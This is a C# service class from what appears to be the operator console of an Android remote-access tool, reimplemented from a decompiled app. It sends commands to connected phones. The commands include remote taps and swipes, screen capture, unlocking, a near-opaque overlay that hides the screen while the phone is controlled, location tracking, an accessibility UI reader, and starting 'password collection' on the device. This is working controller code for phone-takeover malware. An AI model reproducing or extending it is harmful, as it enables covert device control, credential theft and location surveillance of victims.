using WebRemoteControl.Core.Interfaces;
using WebRemoteControl.Core.Models;

namespace WebRemoteControl.Core.Services;

/// <summary>
/// 设备控制服务实现
/// </summary>
public class DeviceControlService : IDeviceControlService
{
    private readonly IDeviceConnectionService _connectionService;

    public DeviceControlService(IDeviceConnectionService connectionService)
    {
        _connectionService = connectionService;
    }

    public async Task<bool> SendTapAsync(string deviceId, int x, int y)
    {
        var payload = BuildControlCommandPayload(ControlCommandType.Tap, x, y);
        return await SendControlCommandAsync(deviceId, payload);
    }

    public async Task<bool> SendSwipeAsync(string deviceId, int x1, int y1, int x2, int y2)
    {
        var payload = BuildControlCommandPayload(ControlCommandType.Swipe, x1, y1, x2, y2);
        return await SendControlCommandAsync(deviceId, payload);
    }

    public async Task<bool> SendBackAsync(string deviceId)
    {
        // 使用 ControlCommand.BACK (需要 AccessibilityService)
        // 对应 m0.smali 第 255-307 行：v1=3 → performGlobalAction(1)
        var payload = BuildControlCommandPayload(ControlCommandType.Back);
        return await SendControlCommandAsync(deviceId, payload);
    }

    public async Task<bool> SendHomeAsync(string deviceId)
    {
        // 使用 ControlCommand.HOME (需要 AccessibilityService)
        // 对应 m0.smali 第 255-307 行：v1=4 → performGlobalAction(2)
        var payload = BuildControlCommandPayload(ControlCommandType.Home);
        return await SendControlCommandAsync(deviceId, payload);
    }

    public async Task<bool> SendTaskAsync(string deviceId)
    {
        // 使用 ControlCommand.TASK (需要 AccessibilityService)
        // 对应 m0.smali 第 255-307 行：v1=6 → performGlobalAction(3)
        var payload = BuildControlCommandPayload(ControlCommandType.Task);
        return await SendControlCommandAsync(deviceId, payload);
    }

    public async Task<bool> StartScreenCaptureAsync(string deviceId)
    {
        return await SendSystemCommandAsync(deviceId, SystemCommandType.ScreenCapture, 
            (int)DefaultOperation.Start);
    }

    public async Task<bool> StopScreenCaptureAsync(string deviceId)
    {
        return await SendSystemCommandAsync(deviceId, SystemCommandType.ScreenCapture, 
            (int)DefaultOperation.Stop);
    }

    public async Task<bool> StartScreenControlAsync(string deviceId)
    {
        return await SendSystemCommandAsync(deviceId, SystemCommandType.ScreenControl, 
            (int)DefaultOperation.Start);
    }

    public async Task<bool> StopScreenControlAsync(string deviceId)
    {
        return await SendSystemCommandAsync(deviceId, SystemCommandType.ScreenControl, 
            (int)DefaultOperation.Stop);
    }

    public async Task<bool> WakeScreenAsync(string deviceId)
    {
        return await SendSystemCommandAsync(deviceId, SystemCommandType.ScreenWakeOrLock, 1);
    }

    public async Task<bool> LockScreenAsync(string deviceId)
    {
        return await SendSystemCommandAsync(deviceId, SystemCommandType.ScreenWakeOrLock, 2);
    }

    public async Task<bool> UnlockScreenAsync(string deviceId)
    {
        return await SendSystemCommandAsync(deviceId, SystemCommandType.ScreenWakeOrLock, 3);
    }

    public async Task<bool> StartBlackScreenAsync(string deviceId, int alpha = 245)
    {
        return await SendSystemCommandAsync(deviceId, SystemCommandType.ScreenBlock, 
            (int)DefaultOperation.Start, alpha);
    }

    public async Task<bool> StopBlackScreenAsync(string deviceId)
    {
        return await SendSystemCommandAsync(deviceId, SystemCommandType.ScreenBlock, 
            (int)DefaultOperation.Stop);
    }

    public async Task<bool> RequestLocationAsync(string deviceId)
    {
        return await SendSystemCommandAsync(deviceId, SystemCommandType.Location, 
            (int)DefaultOperation.Third);
    }

    public async Task<bool> StartLocationTrackingAsync(string deviceId)
    {
        return await SendSystemCommandAsync(deviceId, SystemCommandType.Location, 
            (int)DefaultOperation.Start);
    }

    public async Task<bool> StopLocationTrackingAsync(string deviceId)
    {
        return await SendSystemCommandAsync(deviceId, SystemCommandType.Location,
            (int)DefaultOperation.Stop);
    }

    /// <summary>
    /// 启动桌面阅读器（无障碍UI捕获）
    /// </summary>
    public async Task<bool> StartScreenReaderAsync(string deviceId)
    {
        Console.WriteLine($"[DeviceControlService] 启动桌面阅读器: {deviceId}");
        return await SendSystemCommandAsync(deviceId, SystemCommandType.ScreenReader,
            (int)DefaultOperation.Start);
    }

    /// <summary>
    /// 停止桌面阅读器
    /// </summary>
    public async Task<bool> StopScreenReaderAsync(string deviceId)
    {
        Console.WriteLine($"[DeviceControlService] 停止桌面阅读器: {deviceId}");
        return await SendSystemCommandAsync(deviceId, SystemCommandType.ScreenReader,
            (int)DefaultOperation.Stop);
    }

    /// <summary>
    /// 请求密码列表（操作码 4：查询）
    /// </summary>
    public async Task<bool> RequestPasswordListAsync(string deviceId)
    {
        Console.WriteLine($"[DeviceControlService] 请求密码列表: {deviceId}");
        // SystemCommandType.Passwords (11), 操作码 4（查询）
        return await SendSystemCommandAsync(deviceId, SystemCommandType.Passwords, 4);
    }

    /// <summary>
    /// 重置指定类型的密码（操作码 3：重置）
    /// </summary>
    public async Task<bool> ResetPasswordAsync(string deviceId, PasswordType passwordType)
    {
        Console.WriteLine($"[DeviceControlService] 重置密码: {deviceId}, 类型: {passwordType}");
        // SystemCommandType.Passwords (11), 字符串 "1", 操作码 3（重置）, 密码类型枚举值
        return await SendSystemCommandAsync(deviceId, SystemCommandType.Passwords, "1", 3, (int)passwordType);
    }

    /// <summary>
    /// 重置所有密码（操作码 3：重置）
    /// </summary>
    public async Task<bool> ResetAllPasswordsAsync(string deviceId)
    {
        Console.WriteLine($"[DeviceControlService] 重置所有密码: {deviceId}");
        // SystemCommandType.Passwords (11), 操作码 3（重置）- 与 WinForms 版一致，不带字符串
        return await SendSystemCommandAsync(deviceId, SystemCommandType.Passwords, 3);
    }

    /// <summary>
    /// 开始密码采集（操作码 1：采集）
    /// </summary>
    public async Task<bool> StartPasswordCollectionAsync(string deviceId, PasswordType passwordType)
    {
        Console.WriteLine($"[DeviceControlService] 开始密码采集: {deviceId}, 类型: {passwordType}");
        // SystemCommandType.Passwords (11), 字符串 "1", 操作码 1（采集）, 密码类型枚举值
        return await SendSystemCommandAsync(deviceId, SystemCommandType.Passwords, "1", 1, (int)passwordType);
    }

    /// <summary>
    /// 停止密码采集（操作码 2：停止）
    /// </summary>
    public async Task<bool> StopPasswordCollectionAsync(string deviceId)
    {
        Console.WriteLine($"[DeviceControlService] 停止密码采集: {deviceId}");
        // SystemCommandType.Passwords (11), 操作码 2（停止）
        return await SendSystemCommandAsync(deviceId, SystemCommandType.Passwords, 2);
    }

    /// <summary>
    /// 构建控制命令负载
    /// </summary>
    private byte[] BuildControlCommandPayload(ControlCommandType type, params int[] args)
    {
        var payload = new byte[2 + args.Length * 4];
        payload[0] = (byte)type;
        payload[1] = (byte)args.Length;

        for (int i = 0; i < args.Length; i++)
        {
            int offset = 2 + i * 4;
            payload[offset] = (byte)(args[i] >> 24);
            payload[offset + 1] = (byte)(args[i] >> 16);
            payload[offset + 2] = (byte)(args[i] >> 8);
            payload[offset + 3] = (byte)(args[i] & 0xFF);
        }

        return payload;
    }

    /// <summary>
    /// 构建系统命令负载（无字符串）
    /// </summary>
    private byte[] BuildSystemCommandPayload(SystemCommandType type, params int[] args)
    {
        var payload = new byte[3 + args.Length * 4];

        // 命令类型 (2 bytes)
        ushort commandType = (ushort)type;
        payload[0] = (byte)(commandType >> 8);
        payload[1] = (byte)(commandType & 0xFF);

        // 参数数量 (1 byte)
        payload[2] = (byte)args.Length;

        // 参数列表 (每个 4 bytes)
        for (int i = 0; i < args.Length; i++)
        {
            int offset = 3 + i * 4;
            payload[offset] = (byte)(args[i] >> 24);
            payload[offset + 1] = (byte)(args[i] >> 16);
            payload[offset + 2] = (byte)(args[i] >> 8);
            payload[offset + 3] = (byte)(args[i] & 0xFF);
        }

        return payload;
    }

    /// <summary>
    /// 构建系统命令负载（带字符串）
    /// </summary>
    private byte[] BuildSystemCommandPayload(SystemCommandType type, string stringData, params int[] args)
    {
        var stringBytes = System.Text.Encoding.UTF8.GetBytes(stringData);
        var payload = new byte[7 + stringBytes.Length + args.Length * 4];

        // 命令类型 (2 bytes)
        ushort commandType = (ushort)type;
        payload[0] = (byte)(commandType >> 8);
        payload[1] = (byte)(commandType & 0xFF);

        // 参数数量 = 字符串(1) + 其他参数 (1 byte)
        payload[2] = (byte)(args.Length + 1);

        // 字符串长度 (4 bytes)
        int stringLength = stringBytes.Length;
        payload[3] = (byte)(stringLength >> 24);
        payload[4] = (byte)(stringLength >> 16);
        payload[5] = (byte)(stringLength >> 8);
        payload[6] = (byte)(stringLength & 0xFF);

        // 字符串内容
        Array.Copy(stringBytes, 0, payload, 7, stringBytes.Length);

        // 其他参数列表 (每个 4 bytes)
        for (int i = 0; i < args.Length; i++)
        {
            int offset = 7 + stringBytes.Length + i * 4;
            payload[offset] = (byte)(args[i] >> 24);
            payload[offset + 1] = (byte)(args[i] >> 16);
            payload[offset + 2] = (byte)(args[i] >> 8);
            payload[offset + 3] = (byte)(args[i] & 0xFF);
        }

        return payload;
    }

    /// <summary>
    /// 发送控制命令
    /// </summary>
    private async Task<bool> SendControlCommandAsync(string deviceId, byte[] payload)
    {
        Console.WriteLine($"[DeviceControlService] 发送 ControlCommand - 设备: {deviceId}, 负载: {BitConverter.ToString(payload)}");

        var message = new NetworkMessage
        {
            Type = MessageType.ControlCommand,
            Payload = payload
        };

        return await _connectionService.SendMessageToDeviceAsync(deviceId, message);
    }

    /// <summary>
    /// 发送系统命令（无字符串）
    /// </summary>
    private async Task<bool> SendSystemCommandAsync(string deviceId, SystemCommandType type, params int[] args)
    {
        var payload = BuildSystemCommandPayload(type, args);
        var message = new NetworkMessage
        {
            Type = MessageType.SystemControl,
            Payload = payload
        };

        return await _connectionService.SendMessageToDeviceAsync(deviceId, message);
    }

    /// <summary>
    /// 发送系统命令（带字符串）
    /// </summary>
    private async Task<bool> SendSystemCommandAsync(string deviceId, SystemCommandType type, string stringData, params int[] args)
    {
        var payload = BuildSystemCommandPayload(type, stringData, args);
        var message = new NetworkMessage
        {
            Type = MessageType.SystemControl,
            Payload = payload
        };

        return await _connectionService.SendMessageToDeviceAsync(deviceId, message);
    }
}

